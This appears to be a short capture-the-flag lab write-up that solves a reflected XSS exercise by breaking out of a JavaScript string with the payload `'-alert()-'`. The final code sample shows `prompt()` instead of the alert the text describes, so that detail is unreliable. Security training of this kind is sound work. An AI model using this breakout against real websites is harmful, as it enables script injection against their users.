## 9 - Reflected XSS into a JavaScript string with angle brackets HTML encoded

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

## Notes

- Search page
- Possibility to leave a comment
- `/resources/images/tracker.gif`

## Resume

1. Go on search page
2. Exploit XSS

## Solve

Go to search page and type an random string, then find where is stored the search : 

```js
 <script>
    var searchTerms = '"&lt;/&gt;&lt;h1&gt;TEST&lt;/h1&gt;';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Replace your input with the following payload to break out of the JavaScript string and inject an alert: 

`'-alert()-'`

And see the result in the answer : 

```js
<script>
    var searchTerms = ''-prompt()-'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```